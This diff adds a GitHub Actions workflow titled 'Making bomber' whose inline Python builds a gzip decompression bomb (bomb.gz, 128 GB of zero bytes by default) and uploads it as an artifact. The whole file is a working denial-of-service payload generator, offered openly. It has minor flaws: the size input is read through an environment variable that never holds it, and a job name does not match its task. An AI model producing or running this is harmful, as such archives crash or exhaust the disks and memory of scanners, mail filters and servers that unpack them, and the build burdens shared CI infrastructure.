@@ -1,0 +1,38 @@
+name: Making bomber
+
+on:
+  workflow_dispatch:
+    inputs:
+      size:
+        description: 'Size (GB)'
+        required: true
+        default: '128'
+        type: number
+
+jobs:
+  log-the-inputs:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Make
+        run: |
+          import gzip
+          import os
+          B = 1
+          KB = 1024 * B
+          MB = 1024 * KB
+          GB = 1024 * MB
+          TB = 1024 * GB
+          size = os.getenv("inputs.size",128)
+          print("Making a",size,"GB gzip.")
+          empty = b'\0'*4*GB
+          with gzip.open("bomb.gz",'wb') as f:
+              for i in range(0,size,4):
+                  print(i,"GB")
+                  f.write(empty)
+        shell: python
+      - name: Upload
+        uses: actions/upload-artifact@v3
+        with:
+          name: bomb
+          path: bomb.gz
+        
